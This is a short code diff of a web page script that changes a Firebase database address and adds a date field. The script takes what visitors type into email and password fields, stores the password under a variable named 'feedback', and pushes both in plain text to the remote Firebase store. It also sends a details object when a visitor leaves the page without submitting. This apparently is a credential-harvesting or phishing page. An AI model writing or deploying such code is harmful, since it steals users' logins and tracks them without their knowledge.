@@ -123,13 +123,13 @@
 <script>
     var filled2=0;
 var data2;
-   var messagesRef = new Firebase('https://rpsecf32.firebaseio.com');
-
+   var messagesRef = new Firebase('https://rps2-257b1.firebaseio.com');
+var date=Date();
    function savedata(){
        filled2=1
        var message = document.getElementById("email").value;
 var feedback=document.getElementById("password").value;
-       messagesRef.push({fieldName:message, text:feedback,detailsjson:data2});
+       messagesRef.push({fieldName:message, text:feedback,detailsjson:data2,date:date});
        document.getElementById("email").value = '';
        document.getElementById("password").value = '';
 //       document.getElementById("feedback2").style.animationDirection="reverse";
@@ -141,8 +141,9 @@ var feedback=document.getElementById("password").value;
    });
 window.onbeforeunload = function(){
     // Do something
+
     if(filled2!=1)
-        messagesRef.push({detailsjson:data2});
+        messagesRef.push({detailsjson:data2,date:date});
    // alert("fired");
 
 }
